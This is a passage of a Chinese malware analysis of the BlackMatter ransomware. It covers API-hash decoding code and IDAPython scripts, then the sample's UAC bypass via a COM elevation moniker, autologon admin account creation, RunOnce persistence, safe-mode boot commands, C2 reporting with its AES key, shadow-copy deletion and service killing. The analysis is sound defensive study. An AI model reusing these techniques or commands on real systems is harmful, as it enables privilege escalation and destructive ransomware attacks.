        <span class="k">if</span><span class="p">(</span><span class="n">each</span> <span class="o">&gt;</span> <span class="mh">0x40</span> <span class="ow">and</span> <span class="n">each</span> <span class="o">&lt;</span> <span class="mh">0x5b</span><span class="p">):</span>
            <span class="n">each</span> <span class="o">=</span> <span class="n">each</span> <span class="o">|</span> <span class="mh">0x20</span>
        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span> <span class="o">&gt;&gt;</span> <span class="mh">0xd</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">result</span> <span class="o">&lt;&lt;</span> <span class="mh">0x13</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span><span class="o">+</span><span class="n">each</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">mask</span>
    <span class="k">return</span> <span class="n">result</span>
</code></pre></div><p><code>Get_Func_Name_Hash</code>函数略有不同，但大同小异：</p>
<p><img src="/blackmatter_images/1134525180093.png" alt=""></p>
<p><code>python</code>代码如下：</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">Calc_Func_Hash</span><span class="p">(</span><span class="n">dll_name</span><span class="p">,</span> <span class="n">func_name</span><span class="p">):</span>
    <span class="n">mask</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">dll_name</span>
    <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">func_name</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">:</span>
        <span class="n">each</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">each</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span> <span class="o">&gt;&gt;</span> <span class="mh">0xd</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">result</span> <span class="o">&lt;&lt;</span> <span class="mh">0x13</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span><span class="o">+</span><span class="n">each</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">mask</span>
    <span class="k">return</span> <span class="n">result</span>
</code></pre></div><p><strong>检验代码的有效性</strong></p>
<p>实际上要调用的函数散列可以如下这般进行计算：</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">dll_name</span> <span class="o">=</span> <span class="s2">&#34;kernel32.dll&#34;</span>
<span class="n">func_name</span> <span class="o">=</span> <span class="s2">&#34;LoadLibraryA&#34;</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">Calc_Func_Hash</span><span class="p">(</span><span class="n">Calc_Dll_Hash</span><span class="p">(</span><span class="n">dll_name</span><span class="p">),</span> <span class="n">func_name</span><span class="p">)))</span>

<span class="n">dll_name</span> <span class="o">=</span> <span class="s2">&#34;kernel32.dll&#34;</span>
<span class="n">func_name</span> <span class="o">=</span> <span class="s2">&#34;GetProcAddress&#34;</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">Calc_Func_Hash</span><span class="p">(</span><span class="n">Calc_Dll_Hash</span><span class="p">(</span><span class="n">dll_name</span><span class="p">),</span> <span class="n">func_name</span><span class="p">)))</span>
</code></pre></div><p>返回结果如下：</p>
<pre><code>0x27d05eb2
0xbb93705c
</code></pre><p>实际上加载<code>LoadLibraryA</code>和<code>GetProcAddress</code>的<code>hash</code>确实如此：</p>
<p><img src="/blackmatter_images/3960033176648.png" alt=""></p>
<h3 id="22-加载函数">2.2. 加载函数</h3>
<p>深入到<code>Resolve_API_Hash</code>函数中去，可以发现其逻辑传入两个地址，第一个地址是加载后函数存放地址，第二个地址是待解密加载的<code>hash</code>，解密密钥也很清晰：<code>0x22065FED</code>，当获取到的地址是<code>0xCCCCCCCC</code>时退出加载循环。</p>
<p><img src="/blackmatter_images/4902326117262.png" alt=""></p>
<p>加载函数前有两个<code>push</code>，通过动态调试可以知道第一个<code>push</code>是加载函数存放起始地址，第二个<code>push</code>是需要解密的函数<code>hash</code>存放起始地址。简单调试后可以得到知道每个<code>dll</code>加载时的<code>hash</code></p>
<p><img src="/blackmatter_images/3452450090969.png" alt=""></p>
<p>可以检索一下所有的本地dll文件，计算hash进行比对，</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="nb">dict</span> <span class="o">=</span> <span class="p">{}</span>
<span class="k">for</span> <span class="n">filename</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s2">&#34;C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">System32&#34;</span><span class="p">):</span>
    <span class="k">if</span> <span class="s1">&#39;.dll&#39;</span> <span class="ow">in</span> <span class="n">filename</span><span class="p">:</span>
        <span class="n">dll_hash</span> <span class="o">=</span> <span class="n">Calc_Dll_Hash</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
        <span class="n">dll_name</span> <span class="o">=</span> <span class="n">filename</span>
        <span class="nb">dict</span><span class="p">[</span><span class="nb">hex</span><span class="p">(</span><span class="n">dll_hash</span><span class="p">)</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="p">]</span> <span class="o">=</span> <span class="n">filename</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;411677B7:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X411677B7&#39;</span><span class="p">])</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;B1FC7F66:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XB1FC7F66&#39;</span><span class="p">])</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;BCFA1667:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XBCFA1667&#39;</span><span class="p">])</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;7132A177:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X7132A177&#39;</span><span class="p">])</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;3032403A:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X3032403A&#39;</span><span class="p">])</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;391830B4:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X391830B4&#39;</span><span class="p">])</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;38327FBA:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X38327FBA&#39;</span><span class="p">])</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;C50C676F:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XC50C676F&#39;</span><span class="p">])</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;820A18A3:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X820A18A3&#39;</span><span class="p">])</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;FD1A17C6:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XFD1A17C6&#39;</span><span class="p">])</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;41E8A017:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X41E8A017&#39;</span><span class="p">])</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;3CFC1737:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X3CFC1737&#39;</span><span class="p">])</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;C3BC5607:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XC3BC5607&#39;</span><span class="p">])</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;76E87915:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X76E87915&#39;</span><span class="p">])</span>
</code></pre></div><p>最终计算结果如下：</p>
<pre><code>411677B7:ntdll.dll
B1FC7F66:kernel32.dll
BCFA1667:advapi32.dll
7132A177:user32.dll
3032403A:gdi32.dll
391830B4:shell32.dll
38327FBA:ole32.dll
C50C676F:shlwapi.dll
820A18A3:oleaut32.dll
FD1A17C6:wtsapi32.dll
41E8A017:RstrtMgr.dll
3CFC1737:netapi32.dll
C3BC5607:activeds.dll
76E87915:wininet.dll
</code></pre><p>查看第二个参数地址可以找到需要进行加载的<code>hash</code>再未进行异或前的<code>hash</code>。
<img src="/blackmatter_images/4401659177428.png" alt=""></p>
<h3 id="23-idapython解密">2.3. IDAPython解密</h3>
<p>根据上面的结论，可以进行简单的逻辑实现：</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># 传入Resolve_API_Hash函数的的地址</span>
<span class="k">def</span> <span class="nf">Resolve_All_APIs</span><span class="p">(</span><span class="n">resolve_ea</span><span class="p">):</span>
    <span class="c1"># 获取dll加载函数的交叉引用地址</span>
    <span class="k">for</span> <span class="n">ref</span> <span class="ow">in</span> <span class="n">idautils</span><span class="o">.</span><span class="n">CodeRefsTo</span><span class="p">(</span><span class="n">resolve_ea</span><span class="p">,</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">current_ea</span> <span class="o">=</span> <span class="n">ref</span>
        <span class="n">api_addr_ea</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="n">api_hashes_ea</span> <span class="o">=</span> <span class="mi">0</span>

        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
            <span class="c1"># 获取上一条汇编语言的地址</span>
            <span class="n">prev_instruction_ea</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">current_ea</span><span class="p">)</span>
            <span class="c1"># 判断助记符是否为push</span>
            <span class="k">if</span> <span class="n">idc</span><span class="o">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">prev_instruction_ea</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;push&#39;</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">api_addr_ea</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                    <span class="c1"># 向上第一条push是api写入地址</span>
                    <span class="n">api_addr_ea</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">prev_instruction_ea</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="c1"># 再向上一条push是apihash存储的地址</span>
                    <span class="n">api_hashes_ea</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">prev_instruction_ea</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
                    <span class="k">break</span>
            <span class="n">current_ea</span> <span class="o">=</span> <span class="n">prev_instruction_ea</span>

        <span class="n">api_addr_ea</span> <span class="o">+=</span> <span class="mi">4</span>
        <span class="n">api_hashes_ea</span> <span class="o">+=</span> <span class="mi">4</span>

        <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
            <span class="c1"># 根据地址获取hash</span>
            <span class="n">api_hash</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_wide_dword</span><span class="p">(</span><span class="n">api_hashes_ea</span> <span class="o">+</span> <span class="mi">4</span><span class="o">*</span><span class="n">index</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">api_hash</span> <span class="o">==</span> <span class="mh">0xCCCCCCCC</span><span class="p">:</span>
                <span class="k">break</span>
            <span class="c1"># 进行异或解密</span>
            <span class="n">api_hash</span> <span class="o">=</span> <span class="n">api_hash</span> <span class="o">^</span> <span class="mh">0x22065FED</span>
            <span class="k">if</span> <span class="n">api_hash</span> <span class="ow">in</span> <span class="n">export_hashes</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="n">export_hashes</span><span class="p">[</span><span class="n">api_hash</span><span class="p">])</span>
                <span class="c1"># 写入地址对应的api函数名</span>
                <span class="n">idc</span><span class="o">.</span><span class="n">set_name</span><span class="p">(</span><span class="n">api_addr_ea</span> <span class="o">+</span> <span class="mi">4</span><span class="o">*</span><span class="n">index</span><span class="p">,</span> <span class="s1">&#39;mw_&#39;</span> <span class="o">+</span> <span class="n">export_hashes</span><span class="p">[</span><span class="n">api_hash</span><span class="p">],</span> <span class="n">idaapi</span><span class="o">.</span><span class="n">SN_CHECK</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">api_addr_ea</span><span class="p">),</span><span class="s1">&#39;NOTFOUND&#39;</span><span class="p">)</span>
            <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
</code></pre></div><h2 id="3-bypassuac">3. BypassUAC</h2>
<p>当成功加载<code>dll</code>后，开始检查当前用户的<code>RID</code>是否是<code>administrators</code>:</p>
<p><img src="/blackmatter_images/944715141047.png" alt=""></p>
<p>接着通过对比<code>OSMajorVersion</code>与<code>OSMinorVersion</code>检查操作系统版本：</p>
<p><img src="/blackmatter_images/5467628159473.png" alt=""></p>
<p>从<code>TOKEN_GROUPS</code>中判断进程令牌是否是<code>admin</code>权限。</p>
<p><img src="/blackmatter_images/200218177506.png" alt=""></p>
<p>如果不是<code>admin</code>权限运行，则进行提权，使用<code>LdrEnumerateLoadedModules</code>将<code>C:\\Windows\\System32\\dllhost.exe</code>注入到进程的<code>PEB</code>中，这样可以使用<code>dllhost.exe</code>接管<code>COM</code>对象。</p>
<p><img src="/blackmatter_images/3381612236730.png" alt=""></p>
<p>调用<code>CoGetObject</code>创建以下对象：</p>
<pre><code>Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
</code></pre><p>通过<code>COM</code>库重载自身，从而达到权限提升的目的，整个<code>BypassUAC</code>过程如下：</p>
<p><img src="/blackmatter_images/5558435232484.png" alt=""></p>
<p>最后再调用<code>NtTerminateProcess</code>终止自身。</p>
<h2 id="4-勒索设备id号生成">4. 勒索设备ID号生成</h2>
<p>获取注册表项<code>SOFTWARE\Microsoft\Cryptography</code>中的<code>MachineGuid</code>，经过三次<code>ror13</code>，再进行字节反转，最后<code>base64</code>编码一次，再将<code>+</code>、<code>/</code>、<code>=</code>符号进行转义，生成勒索设备ID号。</p>
<p><img src="/blackmatter_images/803600179474.png" alt=""></p>
<p>解密出勒索信文件名<code>%s.README.txt</code>：</p>
<p><img src="/blackmatter_images/2694503167341.png" alt=""></p>
<h2 id="5-窃取登录凭证">5. 窃取登录凭证</h2>
<p>接着会尝试使用<code>LogonUserW</code>窃取登录凭证：</p>
<p><img src="/blackmatter_images/843407190176.png" alt=""></p>
<p>然后检查该用户是否属于<code>DOMAINNAME\Domain Admins</code>：</p>
<p><img src="/blackmatter_images/1674812186731.png" alt=""></p>
<h2 id="6-勒索主体">6. 勒索主体</h2>
<p>该功能模块主要是根据不同的命令参数进行功能分化，不同的参数执行不同的功能：</p>
<p><img src="/blackmatter_images/4842829189475.png" alt=""></p>
<h3 id="61-命令参数解析">6.1. 命令参数解析</h3>
<p>可以看到<code>BlackMatter</code>支持以下四个命令参数：</p>
<pre><code>-path &lt;pwd&gt;      加密&lt;pwd&gt;路径的文件
&lt;pwd&gt;            加密&lt;pwd&gt;路径的文件
-safe            安全模式重启
-wall            设置壁纸
</code></pre><p>由于存储在样本中的是<code>hash</code>，所以只能通过生成明文字典（very luncky），再计算出字符串的<code>hash</code>进行比对，最终确认出明文命令：</p>
<p><img src="/blackmatter_images/5609927141049.png" alt=""></p>
<h3 id="62-指定路径模式">6.2. 指定路径模式</h3>
<p>当使用<code>-path &lt;pwd&gt;</code>或<code>&lt;pwd&gt;</code>参数时，将创建<code>I/O</code>接口进行加密，然后再重写生成加密文件。</p>
<p>当<code>-path &lt;pwd&gt;</code>中的<code>&lt;pwd&gt;</code>是服务器路径时，将检索共享资源进行加密：</p>
<p><img src="/blackmatter_images/2045041219475.png" alt=""></p>
<p>如果<code>-path &lt;pwd&gt;</code>中的<code>&lt;pwd&gt;</code>是文件路径，或仅使用<code>&lt;pwd&gt;</code>参数，则直接加密目录文件：</p>
<p><img src="/blackmatter_images/4241043227508.png" alt=""></p>
<h3 id="63-安全模式">6.3. 安全模式</h3>
<p>当使用<code>-safe</code>参数时，<code>BlackMatter</code>会首先检测是否是<code>RID</code>是否属于<code>BUILTIN\Administrators</code>，如果是，则进行以下操作。</p>
<p><img src="/blackmatter_images/3313706126733.png" alt=""></p>
<h4 id="631-创建自登录账户">6.3.1. 创建自登录账户</h4>
<p>随机生成一个12位的密码：由3个随机大写字母、1个随机字符（<code>#</code>或<code>&amp;</code>）、3个随机数字、1个随机字符（<code>#</code>或<code>&amp;</code>）、4个随机小写字母组成。然后使用<code>NetUserSetInfo</code>创建<code>administrator</code>，密码则是刚才生成的12位字符串。</p>
<p><img src="/blackmatter_images/4580448107343.png" alt=""></p>
<p>然后创建注册表：<code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</code>，设置以下键值：</p>
<pre><code>AutoAdminLogon:1
DefaultUserName:Administrator
DefaultDomainName:[GetComputerNameW()]
DefaultPassword:[Random_Password()]
</code></pre><p>整体结构如下：</p>
<p><img src="/blackmatter_images/4860455127509.png" alt=""></p>
<h4 id="632-runonce自启动">6.3.2. RunOnce自启动</h4>
<p>为了实现持久化，<code>BlackMatter</code>会随机生成一个9位数值名称：由3个随机大写字母、3个随机数字和3个随机小写字母组成，数值内容为当前路径，写入到注册表：<code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>中。</p>
<p><img src="/blackmatter_images/2350758120178.png" alt=""></p>
<h4 id="633-设置生成桌面壁纸">6.3.3. 设置生成桌面壁纸</h4>
<p>根据当前屏幕大小，修改注册表项中的<code>hScreen</code>和<code>wScreen</code>：</p>
<p><img src="/blackmatter_images/233209122487.png" alt=""></p>
<p>当操作系统是<code>windows 10</code>时，会在注册表<code>SOFTWARE\\Policies\\Microsoft\\Windows\\OOBE</code>中设置<code>DisablePrivacyExperience:1</code>：</p>
<p><img src="/blackmatter_images/524210140367.png" alt=""></p>
<p><!-- raw HTML omitted -->壁纸生成的具体细节如下：<!-- raw HTML omitted --></p>
<p>创建<code>Times New Roman</code>字体的句柄，从内存中获取壁纸突显的字符串：</p>
<pre><code>BlackMatter Ransomware encrypted all your files!
To get your data back and keep your privacy safe,
you must find [readme.txt] file
and follow the instructions!
</code></pre><p><img src="/blackmatter_images/3314512137971.png" alt=""></p>
<p>然后以二进制形式将图片写入到<code>C:\ProgramData\[id].bmp</code>，从而生成壁纸文件：</p>
<p><img src="/blackmatter_images/3919418135473.png" alt=""></p>
<p>修改注册表<code>HKEY_CURRENT_USER\Control Panel\Desktop</code>的键值，设置桌面壁纸：</p>
<pre><code>WallPaper:C:\ProgramData\[id].bmp
WallpaperStyle:10
</code></pre><p><img src="/blackmatter_images/992920116714.png" alt=""></p>
<h4 id="634-重启进入安全模式">6.3.4. 重启进入安全模式</h4>
<p><code>BlackMatter</code>会根据当前运行的操作系统版本，选择相应的命令使用<code>WinExec</code>执行，并重启操作系统。
当传递的参数为<code>True</code>时（从上方可以得知，当前模式传递的是<code>True</code>），启用安全模式：</p>
<pre><code>winsows vista 之前的操作系统：bcdedit /set {{current}} safeboot network
winsows vista 之后的操作系统：bootcfg /raw /a /safeboot:network /id 1
</code></pre><p>当传递的参数为<code>False</code>时，该函数还提供了关闭功能：</p>
<pre><code>winsows vista 之前的操作系统：bcdedit /deletevalue {{current}} safeboot
winsows vista 之后的操作系统：bootcfg /raw /fastdetect /id 1
</code></pre><p><img src="/blackmatter_images/1700123139154.png" alt=""></p>
<h3 id="64-壁纸模式">6.4. 壁纸模式</h3>
<p>当使用<code>-wall</code>参数时，<code>BlackMatter</code>仅生成壁纸，具体可参考<a href="#wallpaper">壁纸生成的具体细节</a>。</p>
<h3 id="65-默认模式">6.5. 默认模式</h3>
<p>当什么都不添加时，就进入到该模式，该模式涵盖了大多数的功能。</p>
<p><img src="/blackmatter_images/3815139134290.png" alt=""></p>
<h4 id="651-互斥锁">6.5.1. 互斥锁</h4>
<p>当<code>Mutex_Flag</code>为真时，将运行一次互斥。首先是获取<code>MachineGuid</code>，再通过<code>MD4</code>加密生成<code>hash</code>，再使用<code>OpenMutexW</code>结果来测试是否已存在。</p>
<p><img src="/blackmatter_images/3512845127836.png" alt=""></p>
<p>如果存在，则关闭并退出，如果不存在则创建并继续：</p>
<p><img src="/blackmatter_images/4118951120970.png" alt=""></p>
<h4 id="652-网络请求">6.5.2. 网络请求</h4>
<p>如果配置文件中的<code>Post_Flag</code>为真，则会收集数据并发送到<code>C2</code>服务器。</p>
<p>在加密前会进行一次基本信息的收集，数据结构的<code>json</code>格式如下：</p>
<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
   <span class="nt">&#34;bot_version&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
   <span class="nt">&#34;bot_id&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
   <span class="nt">&#34;bot_company&#34;</span><span class="p">:</span><span class="s2">&#34;%.8x%.8x%.8x%.8x%&#34;</span><span class="p">,</span>
   <span class="nt">&#34;host_hostname&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
   <span class="nt">&#34;host_user&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
   <span class="nt">&#34;host_os&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
   <span class="nt">&#34;host_domain&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
   <span class="nt">&#34;host_arch&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
   <span class="nt">&#34;host_lang&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
   <span class="nt">&#34;disks_info&#34;</span><span class="p">:[</span>
      <span class="p">{</span>						<span class="err">//当存在多个磁盘，该字典将变多</span>
         <span class="nt">&#34;disk_name&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
         <span class="nt">&#34;disk_size&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
         <span class="nt">&#34;free_size&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span>
      <span class="p">}</span>
   <span class="p">]</span>
<span class="p">}</span>
</code></pre></div><p>以下是我在虚拟机中获取的加密前发送数据：</p>
<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
	<span class="nt">&#34;bot_version&#34;</span><span class="p">:</span><span class="s2">&#34;1.2&#34;</span><span class="p">,</span>
	<span class="nt">&#34;bot_id&#34;</span><span class="p">:</span><span class="s2">&#34;26a3ebea3de1f2c535eb81c5456fc830&#34;</span><span class="p">,</span>
	<span class="nt">&#34;bot_company&#34;</span><span class="p">:</span><span class="s2">&#34;512478c08dada2af19e49808fbda5b0b&#34;</span><span class="p">,</span>
	<span class="nt">&#34;host_hostname&#34;</span><span class="p">:</span><span class="s2">&#34;WIN-B1ESUN1R9U8&#34;</span><span class="p">,</span>
	<span class="nt">&#34;host_user&#34;</span><span class="p">:</span><span class="s2">&#34;alee&#34;</span><span class="p">,</span>
	<span class="nt">&#34;host_os&#34;</span><span class="p">:</span><span class="s2">&#34;Windows 7 Ultimate&#34;</span><span class="p">,</span>
	<span class="nt">&#34;host_domain&#34;</span><span class="p">:</span><span class="s2">&#34;WORKGROUP&#34;</span><span class="p">,</span>
	<span class="nt">&#34;host_arch&#34;</span><span class="p">:</span><span class="s2">&#34;x64&#34;</span><span class="p">,</span>
	<span class="nt">&#34;host_lang&#34;</span><span class="p">:</span><span class="s2">&#34;zh-CN&#34;</span><span class="p">,</span>
	<span class="nt">&#34;disks_info&#34;</span><span class="p">:[</span>
		<span class="p">{</span>
			<span class="nt">&#34;disk_name&#34;</span><span class="p">:</span><span class="s2">&#34;C&#34;</span><span class="p">,</span>
			<span class="nt">&#34;disk_size&#34;</span><span class="p">:</span><span class="s2">&#34;102397&#34;</span><span class="p">,</span>
			<span class="nt">&#34;free_size&#34;</span><span class="p">:</span><span class="s2">&#34;70005&#34;</span>
		<span class="p">}</span>
	<span class="p">]</span>
<span class="p">}</span>
</code></pre></div><p>当加密完成以后，还会进行一次结果统计，数据结构的<code>json</code>格式如下：</p>
<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
	<span class="nt">&#34;bot_version&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
	<span class="nt">&#34;bot_id&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
	<span class="nt">&#34;bot_company&#34;</span><span class="p">:</span><span class="s2">&#34;%.8x%.8x%.8x%.8x%&#34;</span><span class="p">,</span>
	<span class="nt">&#34;stat_all_files&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
	<span class="nt">&#34;stat_not_encrypted&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
	<span class="nt">&#34;stat_size&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
	<span class="nt">&#34;execution_time&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
	<span class="nt">&#34;start_time&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
	<span class="nt">&#34;stop_time&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span>
<span class="p">}</span>
</code></pre></div><p>以下是我在虚拟机中获取的加密后发送数据</p>
<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
	<span class="nt">&#34;bot_version&#34;</span><span class="p">:</span><span class="s2">&#34;1.2&#34;</span><span class="p">,</span>
	<span class="nt">&#34;bot_id&#34;</span><span class="p">:</span><span class="s2">&#34;26a3ebea3de1f2c535eb81c5456fc830&#34;</span><span class="p">,</span>
	<span class="nt">&#34;bot_company&#34;</span><span class="p">:</span><span class="s2">&#34;512478c08dada2af19e49808fbda5b0b&#34;</span><span class="p">,</span>
	<span class="nt">&#34;stat_all_files&#34;</span><span class="p">:</span><span class="s2">&#34;16499&#34;</span><span class="p">,</span>
	<span class="nt">&#34;stat_not_encrypted&#34;</span><span class="p">:</span><span class="s2">&#34;3&#34;</span><span class="p">,</span>
	<span class="nt">&#34;stat_size&#34;</span><span class="p">:</span><span class="s2">&#34;1282&#34;</span><span class="p">,</span>
	<span class="nt">&#34;execution_time&#34;</span><span class="p">:</span><span class="s2">&#34;829&#34;</span><span class="p">,</span>
	<span class="nt">&#34;start_time&#34;</span><span class="p">:</span><span class="s2">&#34;1633799826&#34;</span><span class="p">,</span>
	<span class="nt">&#34;stop_time&#34;</span><span class="p">:</span><span class="s2">&#34;1633800656&#34;</span>
<span class="p">}</span>
</code></pre></div><p>获取到数据后，会通过<code>AES</code>加密，再通过<code>base64</code>编码：</p>
<p><img src="/blackmatter_images/4454242190921.png" alt=""></p>
<p><code>AES</code>加密的密钥为：<code>A6F330B09CD47B4FB9214F7836AA46AD</code></p>
<p><img src="/blackmatter_images/2348558197308.png" alt=""></p>
<p>最终的<code>C2</code>服务器为：<code>https[:]//paymenthacks.com</code></p>
<p><img src="/blackmatter_images/4878954196676.png" alt=""></p>
<h4 id="653-清除回收站数据">6.5.3. 清除回收站数据</h4>
<p>在加密前，会遍历每一个磁盘驱动器上的第一个<code>recycle</code>文件：</p>
<p><img src="/blackmatter_images/5382300124004.png" alt=""></p>
<p>然后删除所有<code>S-</code>开头的文件：</p>
<p><img src="/blackmatter_images/4865402132951.png" alt=""></p>
<h4 id="654-删除卷影副本">6.5.4. 删除卷影副本</h4>
<p>使用<code>CoCreateInstance</code>创建两个对象，然后使用<code>IWbemServices::ExecQuery</code>方法执行<code>WQL</code>查询<code>SELECT * FROM Win32_ShadowCopy</code>检索卷影副本对象：</p>
<p><img src="/blackmatter_images/5327813125836.png" alt=""></p>
<p>调用<code>IEnumWbemClassObject::Next</code>枚举系统上的所有卷影副本，调用<code>IEnumWbemClassObject::Get</code>获取每个卷影副本的 ID，并调用<code>IWbemServices::DeleteInstance</code>删除它们。</p>
<h4 id="655-终止服务">6.5.5. 终止服务</h4>
<p>当<code>Kill_Service_Flag</code>为<code>True</code>时，使用<code>OpenSCManagerW</code>获取服务控制管理器句柄，然后使用<code>EnumServicesStatusExW</code>枚举所有服务，对比是否在终止名单中，如果是，则使用<code>ControlService</code>发送控制代码，使用<code>DeleteService</code>删除服务，服务列表如下：</p>
<pre><code>&quot;mepocs&quot;、&quot;memtas&quot;、&quot;veeam&quot;、&quot;svc$&quot;、&quot;backup&quot;、&quot;sql&quot;、&quot;vss&quot;
</code></pre><p><img src="/blackmatter_images/3309612136445.png" alt=""></p>
<h4 id="656-杀死进程">6.5.6. 杀死进程</h4>
